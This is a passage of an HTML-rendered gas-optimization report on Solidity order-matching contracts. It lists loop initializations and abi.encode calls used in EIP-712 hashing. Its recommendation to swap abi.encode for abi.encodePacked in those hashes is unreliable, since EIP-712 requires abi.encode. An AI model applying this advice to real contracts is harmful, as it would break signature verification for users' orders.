class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">621</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">executions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">751</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalFilteredExecutions</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">754</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">217</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">306</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">471</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">272</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">350</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<p>I suggest removing explicit initializations for default values.</p>\n<h2 id=\"g-15-abiencode-is-less-efficient-than-abiencodepacked\" style=\"position:relative;\"><a href=\"#g-15-abiencode-is-less-efficient-than-abiencodepacked\" aria-label=\"g 15 abiencode is less efficient than abiencodepacked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-15] <code>abi.encode()</code> is less efficient than <code>abi.encodePacked()</code></h2>\n<p>Changing <code>abi.encode</code> function to <code>abi.encodePacked</code> can save gas since the <code>abi.encode</code> function pads extra null bytes at the end of the call data, which is unnecessary. Also, in general, <code>abi.encodePacked</code> is more gas-efficient (see <a href=\"https://github.com/ConnorBlockchain/Solidity-Encode-Gas-Comparison\">Solidity-Encode-Gas-Comparison</a>).</p>\n<p>Consider using <code>abi.encodePacked()</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ConsiderationBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">78</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">79</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_EIP_712_DOMAIN_TYPEHASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">80</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_NAME_HASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">81</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_VERSION_HASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">82</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">chainid</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">83</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">84</span><span class=\"mtk1\">              )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">85</span><span class=\"mtk1\">          );</span></span></span></code></pre>\n<p>Consider using the assembly equivalent for <code>abi.encodePacked()</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceBasicOrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">513</span><span class=\"mtk1\">          </span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">514</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">515</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">typeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">516</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offerer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">517</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zone</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">518</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offerItemsHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">519</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">receivedItemsHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">520</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">fulfillmentItemTypes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">orderType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">521</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">522</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">523</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zoneHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">524</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">525</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offererConduitKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">526</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">nonce</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">527</span><span class=\"mtk1\">              )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">528</span><span class=\"mtk1\">          );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">609</span><span class=\"mtk1\">              </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">considerationHashes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">610</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">611</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">typeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">612</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">613</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">614</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">identifierOrCriteria</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">615</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">616</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">617</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">primaryConsiderationItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">618</span><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">619</span><span class=\"mtk1\">              );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">684</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">considerationHashes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">recipientCount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">685</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">686</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">typeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">687</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">688</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">689</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">identifierOrCriteria</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">690</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">691</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">692</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">additionalRecipientItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">693</span><span class=\"mtk1\">                      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">694</span><span class=\"mtk1\">                  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">695</span><span class=\"mtk1\">              }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">756</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">757</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">758</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">hashes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">typeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">759</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">760</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">761</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">identifier</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">762</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">763</span><span class=\"mtk1\">                          </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//Assembly uses OfferItem instead of SpentItem.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">764</span><span class=\"mtk1\">                      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">765</span><span class=\"mtk1\">                  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceConsiderationBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">117</span><span class=\"mtk1\">          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">118</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">119</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_eip712DomainTypeHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">120</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_nameHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">121</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">_versionHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">122</span><span class=\"mtk1\">                  </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">chainid</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">123</span><span class=\"mtk1\">                  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">124</span><span class=\"mtk1\">              )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">125</span><span class=\"mtk1\">          );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reference</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReferenceGettersAndDerivers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">41</span><span class=\"mtk1\">          </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">42</span><span class=\"mtk1\">              </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">43</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">44</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">_OFFER_ITEM_TYPEHASH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">45</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">itemType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">46</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">47</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">identifierOrCriteria</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">48</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">49</span><span class=\"mtk1\">                      </span><span class=\"mtk12\">offerItem</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span></span></span>\n<span 